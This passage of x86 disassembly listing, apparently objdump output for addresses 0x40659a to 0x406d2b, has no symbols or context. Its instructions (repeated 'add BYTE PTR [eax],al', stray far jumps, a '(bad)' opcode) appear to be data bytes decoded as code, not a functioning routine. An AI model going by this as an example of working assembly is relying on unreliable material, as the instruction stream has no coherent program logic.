  40659a:	add    BYTE PTR [ecx+0x0],al
  40659d:	adc    al,0x41
  40659f:	add    BYTE PTR [eax],0x20
  4065a2:	add    BYTE PTR [eax-0x60],0x44
  4065a6:	add    BYTE PTR [eax],dl
  4065a8:	adc    al,0x0
  4065ab:	add    BYTE PTR [ecx],al
  4065ad:	dec    edx
  4065ae:	pusha  
  4065af:	add    BYTE PTR [eax],ah
  4065b1:	es xor dl,al
  4065b4:	add    BYTE PTR [eax+eax*1],dl
  4065b7:	adc    DWORD PTR [edx],ecx
  4065b9:	xchg   esp,eax
  4065ba:	dec    ecx
  4065bb:	adc    DWORD PTR [ebx+0x40240100],eax
  4065c1:	add    BYTE PTR [eax],cl
  4065c3:	or     al,0x44
  4065c5:	and    BYTE PTR [edx+0x20],dl
  4065c8:	add    BYTE PTR [ecx],ah
  4065ca:	and    eax,DWORD PTR [eax]
  4065cc:	and    DWORD PTR [eax+0x1100102],eax
  4065d2:	pop    es
  4065d3:	mov    ds:0x65000c20,al
  4065d8:	add    al,0x14
  4065da:	add    BYTE PTR [eax+eax*1],dl
  4065dd:	or     BYTE PTR [eax-0x7ff8ff40],cl
  4065e3:	inc    edx
  4065e4:	add    BYTE PTR [ecx],ah
  4065e6:	and    BYTE PTR [eax],ah
  4065e8:	add    BYTE PTR [ecx],al
  4065ea:	jo     0x4065ec
  4065ec:	inc    edx
  4065ed:	add    BYTE PTR [eax],al
  4065ef:	inc    ebp
  4065f0:	or     BYTE PTR [eax+0x2],al
  4065f3:	add    BYTE PTR [esp+eiz*4],0x2
  4065f7:	or     BYTE PTR [eax],al
  4065f9:	add    BYTE PTR [eax],al
  4065fb:	add    BYTE PTR [eax+0x4800002],dl
  406601:	sub    BYTE PTR [ecx+0x0],0x1a
  406605:	add    BYTE PTR [eax],al
  406607:	push   eax
  406608:	or     BYTE PTR [eax+0x4],dl
  40660b:	dec    eax
  40660c:	inc    eax
  40660d:	and    BYTE PTR [eax+0x204508c8],ah
  406613:	add    BYTE PTR [ebx+0x1],0xc3
  406617:	inc    eax
  406618:	inc    eax
  406619:	add    DWORD PTR [eax+0x8],edx
  40661c:	add    BYTE PTR [eax+eax*1],al
  40661f:	test   BYTE PTR [eax+edx*1],al
  406622:	add    edx,eax
  406624:	and    BYTE PTR [eax],al
  406626:	sbb    eax,0x60154040
  40662b:	jb     0x4065bb
  40662d:	add    cl,dl
  40662f:	sbb    al,al
  406631:	add    BYTE PTR [eax-0x57f3deee],al
  406637:	add    BYTE PTR [ebx],al
  406639:	test   DWORD PTR [ebx+eiz*1],ecx
  40663c:	add    cl,ah
  40663e:	add    BYTE PTR [eax+0x8001040],al
  406644:	add    BYTE PTR [eax],dl
  406646:	mov    WORD PTR [eax],es
  406648:	pusha  
  406649:	mov    al,ds:0x8624283
  40664e:	add    BYTE PTR [eax+0x14],cl
  406651:	rol    DWORD PTR [ecx],1
  406653:	add    BYTE PTR [eax],al
  406655:	inc    ecx
  406656:	or     BYTE PTR [eax+eax*1+0x20104058],0x24
  40665e:	fs add al,0x0
  406661:	add    BYTE PTR [ecx],al
  406663:	cwde   
  406664:	or     ch,BYTE PTR [eax+0x48180000]
  40666a:	and    ah,BYTE PTR [esp+edx*4+0xd]
  40666e:	add    al,BYTE PTR [eax+0x2000c2f0]
  406674:	add    DWORD PTR [eax+eax*1],eax
  406677:	add    BYTE PTR [eax],al
  406679:	inc    eax
  40667a:	inc    eax
  40667b:	adc    eax,0x2003085
  406680:	add    BYTE PTR [edx],dl
  406682:	sub    al,al
  406684:	inc    eax
  406685:	adc    al,BYTE PTR [esi+0x4]
  406688:	adc    DWORD PTR [eax+0x0],0x0
  40668c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40668d:	add    al,0x40
  40668f:	push   ss
  406690:	fadd   DWORD PTR [edx]
  406692:	add    BYTE PTR [edx+edx*1],al
  406695:	jns    0x40669f
  406697:	add    DWORD PTR [edx],eax
  406699:	inc    eax
  40669a:	dec    eax
  40669b:	or     BYTE PTR [eax],dl
  40669d:	inc    edx
  40669e:	inc    ecx
  40669f:	inc    eax
  4066a0:	add    BYTE PTR [ebp+0x2],al
  4066a3:	add    al,BYTE PTR [eax]
  4066a5:	add    BYTE PTR [ecx+eiz*1],al
  4066a8:	test   al,0x8a
  4066aa:	enter  0x2a0,0x16
  4066ae:	adc    BYTE PTR [eax],bl
  4066b0:	add    BYTE PTR ds:0x48040040,cl
  4066b6:	adc    DWORD PTR [eax],eax
  4066b8:	inc    eax
  4066b9:	push   es
  4066ba:	inc    eax
  4066bb:	adc    BYTE PTR [ebp+0xa3c4015],al
  4066c1:	and    BYTE PTR [eax-0x5ddfdd7c],cl
  4066c7:	add    BYTE PTR [esp],al
  4066ca:	add    ah,BYTE PTR [eax]
  4066cc:	rol    BYTE PTR [esi],0x0
  4066cf:	inc    ecx
  4066d0:	add    BYTE PTR [edx],al
  4066d2:	adc    BYTE PTR [eax+0x4],al
  4066d5:	add    DWORD PTR [ecx-0x7fbcddf0],ebp
  4066db:	and    BYTE PTR [esi-0x7fff2ffe],ch
  4066e1:	inc    esp
  4066e2:	sub    BYTE PTR [eax],al
  4066e4:	push   es
  4066e5:	adc    DWORD PTR [eax],eax
  4066e7:	inc    eax
  4066e8:	enter  0x412,0x10
  4066ec:	inc    eax
  4066ed:	into   
  4066ee:	adc    DWORD PTR [ebx],esi
  4066f0:	popa   
  4066f1:	and    BYTE PTR [eax],0x4
  4066f4:	add    BYTE PTR [eax],0xc8
  4066f7:	add    cl,BYTE PTR [edx]
  4066f9:	inc    eax
  4066fa:	add    BYTE PTR [eax+0x86cc104],cl
  406700:	push   es
  406701:	add    DWORD PTR [eax],eax
  406703:	or     eax,0x20090
  406708:	xor    BYTE PTR [eax],al
  40670a:	dec    esp
  40670b:	and    BYTE PTR [eax],al
  40670d:	inc    eax
  40670e:	adc    ecx,DWORD PTR [eax+0x30004024]
  406714:	adc    BYTE PTR [ecx],dl
  406716:	clc    
  406717:	add    BYTE PTR [eax],al
  406719:	add    BYTE PTR [eax],bh
  40671b:	add    al,0x9
  40671d:	and    eax,ecx
  40671f:	add    BYTE PTR [eax*2+0x420009],cl
  406726:	inc    eax
  406727:	adc    al,0x20
  406729:	add    BYTE PTR [ebx],al
  40672b:	adc    BYTE PTR [edx+0x1],al
  40672e:	add    DWORD PTR [eax],ecx
  406730:	add    BYTE PTR [eax],al
  406732:	sbb    BYTE PTR [eax],ch
  406734:	inc    edx
  406735:	test   eax,0xcd402380
  40673a:	rcl    BYTE PTR [eax],0x41
  40673d:	dec    eax
  40673e:	add    BYTE PTR [eax],al
  406740:	add    al,ah
  406742:	inc    ebp
  406743:	nop
  406744:	dec    esp
  406745:	and    BYTE PTR [eax],dl
  406747:	xchg   edx,eax
  406748:	and    BYTE PTR [eax+0x10040000],al
  40674e:	add    al,0x0
  406750:	and    al,0x84
  406753:	add    DWORD PTR [eax+eax*1],ecx
  406756:	adc    BYTE PTR [eax],cl
  406758:	or     BYTE PTR [ebx+0x4186000],dl
  40675e:	add    BYTE PTR [esi],ah
  406760:	pusha  
  406761:	and    BYTE PTR fs:[eax],al
  406764:	test   BYTE PTR [ecx],al
  406766:	inc    esp
  406767:	add    DWORD PTR [ecx],0x810a868
  40676d:	pusha  
  40676e:	add    al,0x24
  406770:	adc    ch,BYTE PTR [eax]
  406772:	sub    al,BYTE PTR [eax]
  406774:	xchg   edx,eax
  406775:	add    al,0xc0
  406777:	add    BYTE PTR [esi],dl
  406779:	add    BYTE PTR [eax],al
  40677b:	inc    edx
  40677c:	add    al,BYTE PTR [eax+0x21]
  40677f:	add    BYTE PTR [eax],dl
  406781:	add    al,0x4
  406783:	add    BYTE PTR [esp+eax*1],cl
  406786:	add    al,0x26
  406788:	add    eax,DWORD PTR [eax-0x5b]
  40678b:	test   DWORD PTR [eax+0x10],ecx
  40678e:	adc    BYTE PTR [eax+0x9812094],0x0
  406795:	pop    es
  406796:	pusha  
  406797:	inc    ecx
  406798:	add    BYTE PTR [eax+eiz*2+0x8011018],al
  40679f:	add    al,0x5
  4067a1:	add    BYTE PTR [eax+edx*2-0x70],dl
  4067a5:	add    BYTE PTR [eax],dh
  4067a7:	add    eax,0x2011c483
  4067ac:	add    BYTE PTR [esp],al
  4067af:	adc    BYTE PTR [eax-0x80],cl
  4067b2:	add    BYTE PTR [ecx],bl
  4067b4:	and    BYTE PTR [esp+eax*4],0x7
  4067b8:	inc    eax
  4067b9:	or     BYTE PTR [eax],al
  4067bb:	add    al,BYTE PTR [eax]
  4067bd:	inc    eax
  4067be:	pop    ss
  4067bf:	add    BYTE PTR [eax],al
  4067c1:	adc    BYTE PTR [edx],al
  4067c3:	and    BYTE PTR cs:[edx],al
  4067c6:	jmp    FWORD PTR [eax+ecx*1]
  4067c9:	add    eax,0x40541300
  4067ce:	nop
  4067cf:	jo     0x4067d5
  4067d1:	add    DWORD PTR [ecx+ecx*4+0x10007944],eax
  4067d8:	inc    eax
  4067d9:	shl    BYTE PTR [eax-0x80],0x40
  4067dd:	add    BYTE PTR [eax+ebp*4],bh
  4067e0:	adc    BYTE PTR [eax],al
  4067e2:	and    al,ch
  4067e4:	or     al,0x0
  4067e6:	adc    BYTE PTR [esp+ebx*4+0x620a0f9],cl
  4067ed:	or     DWORD PTR [eax],eax
  4067ef:	add    DWORD PTR [eax],0x40c81022
  4067f5:	adc    al,0x49
  4067f8:	add    BYTE PTR [eax],dl
  4067fa:	dec    eax
  4067fb:	or     DWORD PTR [eax+0x4b],edx
  4067fe:	inc    ecx
  4067ff:	add    BYTE PTR [edx+0x809424],ch
  406805:	bound  edx,QWORD PTR [eax]
  406807:	add    BYTE PTR [eax],dh
  406809:	add    BYTE PTR [edx+0x18060000],dl
  40680f:	add    BYTE PTR [ecx-0x7d],al
  406812:	inc    eax
  406813:	add    BYTE PTR [eax-0x80],ah
  406816:	push   eax
  406817:	add    BYTE PTR [eax],al
  406819:	adc    al,cl
  40681b:	pop    es
  40681c:	sub    BYTE PTR [ecx],dh
  40681e:	test   BYTE PTR [eax],ah
  406820:	add    al,BYTE PTR [eax]
  406822:	dec    eax
  406823:	add    eax,DWORD PTR [eax+0x35]
  406826:	adc    ah,ah
  406828:	add    DWORD PTR [eax],edx
  40682a:	inc    eax
  40682b:	mov    BYTE PTR [ecx],dl
  40682d:	mov    WORD PTR [ecx+0x10440043],es
  406833:	adc    al,0xa
  406835:	inc    edx
  406836:	add    BYTE PTR [edx],0x1
  406839:	jmp    0x0:0x40f04040
  406840:	inc    esp
  406841:	ret    
  406842:	and    eax,DWORD PTR [edx]
  406844:	or     BYTE PTR [eax],0x40
  406847:	or     BYTE PTR [ecx+eax*4+0x22500110],0xc0
  40684f:	pusha  
  406850:	adc    eax,0x800852
  406855:	nop
  406856:	or     BYTE PTR [eax],ah
  406858:	add    eax,0x404a20
  40685d:	fsub   DWORD PTR [edi]
  40685f:	sub    BYTE PTR [eax-0x20],dl
  406862:	adc    al,0x58
  406864:	pusha  
  406865:	mov    WORD PTR [eax-0x7bfcfbec],cs
  40686b:	inc    ecx
  40686c:	inc    eax
  40686d:	sbb    DWORD PTR [eax-0x36aaffb0],esp
  406873:	adc    al,BYTE PTR ds:0x46c01808
  406879:	add    dl,BYTE PTR [eax+0x4b02108]
  40687f:	add    al,al
  406881:	or     BYTE PTR [eax],ah
  406883:	add    eax,0x6000620
  406888:	add    BYTE PTR [eax],0x84
  40688b:	add    BYTE PTR [eax],al
  40688d:	inc    eax
  40688e:	add    BYTE PTR [eax],al
  406890:	inc    eax
  406891:	inc    eax
  406892:	add    BYTE PTR [eax],dl
  406894:	dec    eax
  406895:	mov    BYTE PTR [eax],al
  406897:	add    BYTE PTR [eax+ebx*1],dl
  40689a:	add    BYTE PTR [esp+eax*1],al
  40689d:	adc    eax,0x90020
  4068a2:	mov    al,ds:0x10141000
  4068a7:	inc    eax
  4068a8:	push   eax
  4068a9:	add    cl,BYTE PTR [edx]
  4068ab:	add    BYTE PTR [ebp+0x4010ad40],al
  4068b1:	jmp    0x5020:0x1211
  4068b8:	add    BYTE PTR [eax+0x0],al
  4068bb:	add    BYTE PTR [esi+eax*4],cl
  4068be:	add    DWORD PTR ds:0xc1c5,0x222000
  4068c8:	add    dl,BYTE PTR [eax+0x0]
  4068cb:	add    BYTE PTR [eax+0x7440d584],dl
  4068d1:	add    BYTE PTR [eax],al
  4068d3:	inc    eax
  4068d4:	add    BYTE PTR [edx],al
  4068d6:	push   es
  4068d7:	or     al,BYTE PTR [edx]
  4068d9:	or     BYTE PTR [edx-0x7dfff7bc],ch
  4068df:	sub    eax,0x14624
  4068e4:	sbb    BYTE PTR [eax],ah
  4068e6:	inc    esp
  4068e7:	inc    edx
  4068e8:	mov    dl,0x31
  4068ea:	add    cl,BYTE PTR [eax]
  4068ec:	or     BYTE PTR [eax],0x10
  4068ef:	(bad)  
  4068f0:	and    BYTE PTR [ebx+0x8200202],al
  4068f6:	add    BYTE PTR [eax],cl
  4068f8:	and    BYTE PTR [eax],al
  4068fa:	add    BYTE PTR [edx],0x90
  4068fd:	adc    BYTE PTR [ecx],0x0
  406900:	or     BYTE PTR [eax-0x6bf65eff],dl
  406906:	inc    eax
  406907:	inc    ecx
  406908:	add    BYTE PTR [eax],al
  40690a:	add    eax,0x51000282
  40690f:	add    dl,BYTE PTR [eax]
  406911:	and    BYTE PTR [eax-0x80],0x8
  406915:	add    DWORD PTR [eax],esi
  406917:	add    BYTE PTR [edx+0xa534048],ah
  40691d:	add    BYTE PTR [eax],al
  40691f:	or     BYTE PTR [eax+0x40089400],ah
  406925:	adc    DWORD PTR [ebp+0x0],eax
  406928:	inc    ecx
  406929:	xor    al,BYTE PTR [edx]
  40692b:	add    BYTE PTR [eax],0x60
  40692e:	jb     0x406945
  406930:	les    esp,FWORD PTR [eax]
  406932:	add    al,0x94
  406934:	mov    ds:0x46000401,al
  406939:	nop
  40693a:	fwait
  40693b:	add    BYTE PTR [edx],al
  40693d:	jo     0x4068df
  40693f:	test   BYTE PTR [eax],al
  406941:	sbb    DWORD PTR [ecx-0x7b],ebp
  406944:	push   0x78404ca6
  406949:	or     ah,BYTE PTR [edx+0x580840e3]
  40694f:	and    BYTE PTR [eax],al
  406951:	inc    eax
  406952:	add    BYTE PTR [eax],0x42
  406955:	adc    BYTE PTR [eax+0x0],dl
  406958:	cmp    BYTE PTR [ecx+0x400000],al
  40695e:	adc    DWORD PTR [eax-0x6a],eax
  406961:	inc    eax
  406962:	adc    BYTE PTR [eax+eax*1+0x5800c000],al
  406969:	add    BYTE PTR [eax],al
  40696b:	add    DWORD PTR [eax],eax
  40696d:	add    al,0x2
  40696f:	push   eax
  406970:	stos   BYTE PTR es:[edi],al
  406971:	add    BYTE PTR [eax],cl
  406973:	xor    BYTE PTR [esi],cl
  406975:	push   cs
  406976:	or     al,0x0
  406978:	rol    DWORD PTR [ecx],0x0
  40697b:	add    BYTE PTR [eax],al
  40697d:	and    DWORD PTR [ebx],eax
  40697f:	adc    al,0x0
  406981:	shr    BYTE PTR [eax+0x54],0x13
  406985:	inc    ecx
  406986:	add    DWORD PTR [esi],edx
  406988:	inc    eax
  406989:	add    BYTE PTR [eax+eax*4-0x2a],al
  40698d:	add    BYTE PTR [edx+0x60],al
  406990:	adc    DWORD PTR [eax],eax
  406992:	sub    BYTE PTR [esi-0x7bc36000],0x80
  406999:	and    al,0x2e
  40699b:	adc    BYTE PTR [esp+0x3c],al
  40699f:	add    BYTE PTR [eax+eax*1],al
  4069a2:	dec    eax
  4069a3:	les    eax,FWORD PTR [esi+0x4a]
  4069a6:	or     eax,0x18000421
  4069ab:	dec    ecx
  4069ac:	inc    eax
  4069ad:	and    ah,BYTE PTR [eax]
  4069af:	adc    BYTE PTR [eax+eax*1],dl
  4069b2:	inc    eax
  4069b3:	or     BYTE PTR [eax+0x40],dl
  4069b6:	adc    BYTE PTR [eax],al
  4069b8:	inc    eax
  4069b9:	sub    eax,0xd0002221
  4069be:	or     edx,DWORD PTR [edx]
  4069c0:	add    al,0x48
  4069c2:	or     BYTE PTR [ecx+eax*1+0x8000041],ah
  4069c9:	add    eax,0x401c8708
  4069ce:	adc    esp,DWORD PTR [edx]
  4069d0:	add    BYTE PTR [eax],al
  4069d2:	or     BYTE PTR [ecx],al
  4069d4:	call   0x840aa45
  4069d9:	add    BYTE PTR [ecx+eiz*1],al
  4069dc:	and    bl,cl
  4069de:	add    al,0x10
  4069e0:	or     BYTE PTR [eax],ah
  4069e2:	add    BYTE PTR [eax],dl
  4069e4:	add    BYTE PTR [eax*1+0x11a00036],0x40
  4069ec:	add    eax,0x42091080
  4069f1:	jo     0x406a0b
  4069f3:	push   ecx
  4069f4:	inc    eax
  4069f5:	xchg   DWORD PTR [eax],eax
  4069f7:	and    al,BYTE PTR [eax+eax*1]
  4069fa:	add    BYTE PTR [eax+0x4],al
  4069fd:	add    BYTE PTR [eax+0x11],cl
  406a00:	retf   0x2082
  406a03:	add    BYTE PTR [eax+0xb000048],al
  406a09:	inc    esp
  406a0a:	adc    bl,BYTE PTR [eax+0x8]
  406a0d:	adc    BYTE PTR [esi],ch
  406a0f:	sbb    al,0x21
  406a11:	dec    eax
  406a12:	add    al,BYTE PTR [edx]
  406a14:	adc    BYTE PTR [eax],al
  406a16:	xor    al,0xc4
  406a18:	inc    esp
  406a19:	or     BYTE PTR [eax+0x40],al
  406a1c:	add    al,0xa
  406a1e:	add    al,0xe3
  406a20:	add    eax,0x10800334
  406a25:	adc    ah,al
  406a27:	rcl    BYTE PTR [eax+eiz*8+0x8240084],0x0
  406a2f:	mov    BYTE PTR [edx+0x1c],bl
  406a32:	add    al,BYTE PTR [eax]
  406a34:	nop
  406a35:	add    BYTE PTR [eax+eax*1],al
  406a38:	adc    al,0x4
  406a3a:	add    al,dl
  406a3c:	add    BYTE PTR [eax+0x0],al
  406a3f:	add    BYTE PTR [esp+edx*2],cl
  406a42:	add    al,0x0
  406a44:	add    al,0x1
  406a46:	add    BYTE PTR [eax-0x70],al
  406a49:	adc    BYTE PTR [esi+eiz*1],ah
  406a4c:	add    DWORD PTR [ecx+0x62908],esp
  406a52:	adc    al,0x0
  406a54:	and    BYTE PTR [esi+0x25121050],al
  406a5a:	add    al,BYTE PTR [eax+0x12]
  406a5d:	add    BYTE PTR [eax],al
  406a5f:	inc    eax
  406a60:	or     BYTE PTR [eax-0x7e],al
  406a63:	imul   ebx,DWORD PTR [edx],0x8
  406a66:	add    BYTE PTR [edi],dl
  406a68:	adc    al,0x0
  406a6a:	inc    eax
  406a6b:	add    al,al
  406a6d:	add    DWORD PTR [esi+0x8],esp
  406a70:	add    BYTE PTR [eax+0x44803e1a],al
  406a76:	add    DWORD PTR [eax],eax
  406a78:	add    eax,0x80208060
  406a7d:	add    BYTE PTR [ecx],al
  406a7f:	add    BYTE PTR [esi],cl
  406a81:	and    BYTE PTR [eax],ch
  406a83:	lea    ecx,[eax]
  406a85:	add    al,ah
  406a87:	and    BYTE PTR [eax],dh
  406a89:	add    BYTE PTR [eax],al
  406a8b:	inc    esp
  406a8c:	add    BYTE PTR [edx+0x480a4000],al
  406a92:	add    BYTE PTR [eax+0x4],dl
  406a95:	add    eax,0x48000c70
  406a9a:	add    DWORD PTR [eax+0x20],eax
  406a9d:	inc    eax
  406a9e:	add    eax,0x18b80490
  406aa3:	or     BYTE PTR [eax+0x0],dl
  406aa6:	add    BYTE PTR [eax],0x0
  406aa9:	push   es
  406aaa:	dec    esp
  406aab:	nop
  406aac:	add    eax,0x4840424
  406ab1:	add    BYTE PTR [eax],cl
  406ab3:	add    BYTE PTR [esp+eax*1],cl
  406ab6:	push   es
  406ab7:	inc    esp
  406ab8:	add    BYTE PTR [eax],al
  406aba:	push   ecx
  406abb:	add    DWORD PTR [eax],eax
  406abd:	add    al,BYTE PTR [edx]
  406abf:	add    BYTE PTR [eax],cl
  406ac1:	push   0x2a
  406ac3:	xchg   esp,eax
  406ac4:	add    BYTE PTR [edx],ch
  406ac6:	mov    al,ds:0x2110800
  406acb:	add    BYTE PTR [ebx],al
  406acd:	adc    BYTE PTR [eax],bl
  406acf:	sbb    BYTE PTR ds:0x400806,0x0
  406ad6:	add    al,0xc0
  406ad8:	add    BYTE PTR [eiz*4+0x4805a000],dh
  406adf:	and    BYTE PTR [ecx+0x8],0x0
  406ae3:	and    DWORD PTR [ecx+0x5c],eax
  406ae6:	add    BYTE PTR [eax+0x0],0x4
  406aea:	add    al,0x49
  406aec:	add    BYTE PTR [esp+eax*1],al
  406aef:	inc    eax
  406af0:	add    al,0x18
  406af2:	and    BYTE PTR [eax],dl
  406af4:	inc    eax
  406af5:	or     BYTE PTR [edi+ebx*1-0x4cdff000],al
  406afc:	add    al,0x60
  406afe:	add    BYTE PTR es:[eax],bl
  406b01:	adc    BYTE PTR [edx+0x2b000],ah
  406b07:	add    BYTE PTR ds:0xa8b0480,al
  406b0d:	nop
  406b0e:	adc    BYTE PTR [eax],dl
  406b10:	inc    eax
  406b11:	add    BYTE PTR [eax],ah
  406b13:	adc    al,0x80
  406b15:	sub    BYTE PTR [eax+0x5b800404],al
  406b1b:	cwde   
  406b1c:	pop    esi
  406b1d:	and    edx,DWORD PTR [ecx]
  406b1f:	adc    BYTE PTR [eax],al
  406b21:	add    BYTE PTR [eax],al
  406b23:	add    BYTE PTR [ecx],ch
  406b25:	add    DWORD PTR [eax],ecx
  406b27:	and    BYTE PTR [eax+0x34104008],al
  406b2d:	add    al,bl
  406b2f:	or     ah,al
  406b31:	add    BYTE PTR [eax],al
  406b33:	or     BYTE PTR [eax+0x1e510014],0x28
  406b3a:	add    BYTE PTR [eax],al
  406b3c:	add    BYTE PTR [eax+eax*1+0x6203a4a9],cl
  406b43:	add    BYTE PTR [eax],dl
  406b45:	xor    BYTE PTR [ecx],al
  406b47:	add    BYTE PTR [eax+eax*1],0x68
  406b4b:	test   BYTE PTR [eax-0x1c],dl
  406b4e:	push   es
  406b4f:	add    al,BYTE PTR [eax]
  406b51:	adc    eax,DWORD PTR [eax]
  406b53:	add    al,0xc0
  406b55:	xchg   ebx,eax
  406b56:	xor    al,0xa
  406b58:	or     BYTE PTR [eax+0x4039a001],al
  406b5e:	add    BYTE PTR [ecx],al
  406b60:	adc    BYTE PTR [eax+0x608ca481],al
  406b66:	dec    eax
  406b67:	add    BYTE PTR [eax],0x44
  406b6a:	add    BYTE PTR [eax],al
  406b6c:	add    al,0x46
  406b6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b6f:	and    BYTE PTR [ecx-0x7c],al
  406b72:	add    al,0x4
  406b74:	inc    eax
  406b75:	add    BYTE PTR [eax+edx*4],al
  406b78:	cdq    
  406b79:	add    BYTE PTR [eax],al
  406b7b:	adc    DWORD PTR [eax+0x40],ebp
  406b7e:	add    BYTE PTR [eax+0x0],al
  406b81:	and    al,0x42
  406b83:	adc    BYTE PTR [eax],al
  406b85:	adc    BYTE PTR [edx],al
  406b87:	inc    eax
  406b88:	add    BYTE PTR [ecx],al
  406b8a:	or     BYTE PTR [eax],al
  406b8c:	push   eax
  406b8d:	rol    cl,0x4a
  406b90:	or     BYTE PTR [ebx-0x80],al
  406b93:	mov    al,ds:0xc4008310
  406b98:	add    BYTE PTR [ecx],cl
  406b9a:	inc    eax
  406b9b:	mov    ds:0xc8651008,al
  406ba0:	add    BYTE PTR [edx+eax*1+0x18],al
  406ba4:	and    DWORD PTR [edx],esi
  406ba6:	add    BYTE PTR [ecx],bl
  406ba8:	inc    eax
  406ba9:	mov    WORD PTR [eax],es
  406bab:	sbb    BYTE PTR [eax+0x48],dh
  406bae:	xor    BYTE PTR [eax+0x15804000],al
  406bb4:	add    al,cl
  406bb6:	mov    eax,0x42121
  406bbb:	add    BYTE PTR [eax],al
  406bbd:	or     BYTE PTR [eax],al
  406bbf:	push   eax
  406bc0:	and    BYTE PTR [eax+0x40],al
  406bc3:	mov    al,0x66
  406bc5:	add    DWORD PTR [eax],esp
  406bc7:	sbb    BYTE PTR [ecx],al
  406bc9:	mov    bl,0x9
  406bcb:	add    dl,BYTE PTR [eax+eax*4]
  406bce:	add    BYTE PTR [edi+eax*2+0x1],al
  406bd2:	pusha  
  406bd3:	ret    
  406bd4:	inc    eax
  406bd5:	add    DWORD PTR ds:0x5cc02018,0xd6020610
  406bdf:	pop    es
  406be0:	mov    al,0xa0
  406be2:	sbb    BYTE PTR [edx],al
  406be4:	add    eax,0x408788
  406be9:	add    DWORD PTR [eax],0xc0110027
  406bef:	xor    BYTE PTR ds:0x45224472,dh
  406bf5:	sub    BYTE PTR [eax],ah
  406bf7:	add    BYTE PTR [edx],0x1
  406bfa:	nop
  406bfb:	sub    BYTE PTR [eax],cl
  406bfd:	inc    eax
  406bfe:	sbb    BYTE PTR [ecx],al
  406c00:	je     0x406c04
  406c02:	adc    ah,BYTE PTR [edx]
  406c04:	dec    ebx
  406c05:	inc    eax
  406c06:	inc    esp
  406c07:	sub    BYTE PTR [ecx+0x4],al
  406c0a:	add    BYTE PTR [eax],dl
  406c0c:	and    BYTE PTR [eax],0x46
  406c0f:	inc    eax
  406c10:	cmp    BYTE PTR [ecx],ah
  406c12:	dec    eax
  406c13:	or     al,BYTE PTR [ebx+0x0]
  406c16:	rol    BYTE PTR [eax],0x0
  406c19:	add    BYTE PTR [eax],dl
  406c1b:	enter  0x1610,0x2
  406c1f:	and    BYTE PTR [ecx],dh
  406c21:	nop
  406c22:	dec    eax
  406c23:	xor    BYTE PTR [edx],ah
  406c25:	sbb    bl,BYTE PTR [eax]
  406c27:	add    BYTE PTR [ecx],al
  406c29:	or     BYTE PTR [edx+0x40006502],dl
  406c2f:	or     BYTE PTR [eax],al
  406c31:	sub    BYTE PTR [eax+0x2102],0xa
  406c38:	add    BYTE PTR [edx],al
  406c3a:	adc    al,0x16
  406c3c:	add    BYTE PTR [eax],al
  406c3e:	xor    BYTE PTR [esi],0x0
  406c41:	or     dl,ah
  406c43:	nop
  406c44:	mov    BYTE PTR [edx+eax*2],dl
  406c47:	adc    al,0xcc
  406c49:	add    al,0x0
  406c4b:	bound  eax,QWORD PTR [eax]
  406c4d:	add    BYTE PTR [eax],dl
  406c4f:	mov    al,ds:0x50204013
  406c54:	adc    BYTE PTR [eax],dl
  406c56:	pop    eax
  406c57:	add    BYTE PTR [eax],dl
  406c59:	add    DWORD PTR [ecx],edx
  406c5b:	inc    esp
  406c5c:	add    BYTE PTR [eax],al
  406c5e:	add    BYTE PTR [eax],al
  406c60:	rol    BYTE PTR [eax],0xc0
  406c63:	pusha  
  406c64:	sub    DWORD PTR [eax-0x3e5fffe7],eax
  406c6a:	and    BYTE PTR [eax],al
  406c6c:	cmp    BYTE PTR [eax],al
  406c6e:	add    BYTE PTR [eax],al
  406c70:	adc    BYTE PTR [eax],al
  406c72:	add    BYTE PTR [eax+0x8],al
  406c75:	inc    eax
  406c76:	dec    eax
  406c77:	xchg   BYTE PTR [eax],al
  406c79:	adc    al,0x0
  406c7b:	or     DWORD PTR [edi],ecx
  406c7d:	inc    ecx
  406c7e:	rol    BYTE PTR [ecx],0x21
  406c81:	and    ecx,DWORD PTR [eax]
  406c83:	or     BYTE PTR [edx+0x40],ah
  406c86:	rol    BYTE PTR [eax+eiz*1+0x804030],0x0
  406c8e:	add    DWORD PTR [eax-0x80],eax
  406c91:	and    BYTE PTR [eax],al
  406c93:	add    BYTE PTR [edx+0x10001082],ch
  406c99:	nop
  406c9a:	test   BYTE PTR [eax+0x40],al
  406c9d:	pop    ecx
  406c9e:	add    BYTE PTR [eax],cl
  406ca0:	add    ah,al
  406ca2:	add    BYTE PTR [ebx+0x2],cl
  406ca5:	and    BYTE PTR [eax],ch
  406ca7:	push   eax
  406ca8:	add    BYTE PTR [eax+0x4],ah
  406cab:	push   0x41004000
  406cb0:	add    BYTE PTR [ebx],al
  406cb2:	add    al,0x20
  406cb4:	push   eax
  406cb5:	add    al,BYTE PTR [eax]
  406cb7:	and    BYTE PTR [ecx-0x7e],al
  406cba:	pusha  
  406cbb:	and    BYTE PTR [ebx],ah
  406cbd:	sub    al,BYTE PTR [eax]
  406cbf:	or     BYTE PTR [eax+eax*1],al
  406cc2:	or     BYTE PTR [ecx],ah
  406cc4:	and    BYTE PTR [eax+0x4050824],bh
  406cca:	add    BYTE PTR [ecx-0x7c000000],al
  406cd0:	xor    BYTE PTR [ecx+0x0],al
  406cd3:	adc    BYTE PTR [esi+0x1054080],0x0
  406cda:	out    0x2,al
  406cdc:	or     al,BYTE PTR [eax]
  406cde:	or     DWORD PTR [eax-0x30],eax
  406ce1:	rol    BYTE PTR [eax],0x2c
  406ce4:	inc    eax
  406ce5:	pop    es
  406ce6:	add    BYTE PTR [edx],dl
  406ce8:	and    al,0x80
  406cea:	add    al,0x14
  406cec:	xor    BYTE PTR [edx],al
  406cee:	enter  0x5035,0x12
  406cf2:	adc    BYTE PTR [eax],ah
  406cf4:	add    BYTE PTR [ecx+eax*1],cl
  406cf7:	add    BYTE PTR [esp+eax*1+0x10108810],al
  406cfe:	or     al,BYTE PTR [ecx+0x6404]
  406d04:	add    BYTE PTR [esi],al
  406d06:	and    BYTE PTR [eax],al
  406d08:	add    BYTE PTR [eax],al
  406d0a:	add    BYTE PTR [esi],ch
  406d0c:	inc    edx
  406d0d:	add    BYTE PTR [esi+0x40497480],ah
  406d13:	add    BYTE PTR [edx+0x20],cl
  406d16:	push   es
  406d17:	imul   eax,DWORD PTR [eax],0x880b00
  406d1d:	or     al,0x18
  406d1f:	add    al,0x0
  406d21:	add    BYTE PTR [ecx],0x65
  406d24:	add    BYTE PTR [eax],al
  406d26:	or     al,0x0
  406d28:	push   0x50
  406d2a:	dec    eax
  406d2b:	push   eax
